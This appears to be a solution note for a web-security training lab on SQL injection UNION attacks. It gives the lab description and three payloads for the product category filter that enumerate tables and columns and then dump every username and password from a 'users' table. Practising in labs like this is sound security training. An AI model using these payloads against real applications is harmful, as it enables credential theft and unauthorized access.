Title: SQL injection UNION attack, retrieving data from other tables
Level: Practitioner
Desc:  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

category=Gifts' OR 1=1 UNION SELECT table_name,'2' FROM information_schema.tables--

category=Gifts' OR 1=1 UNION SELECT column_name,'2' FROM information_schema.columns where table_name='users'--

category=Gifts' OR 1=1 UNION SELECT username,password FROM users--
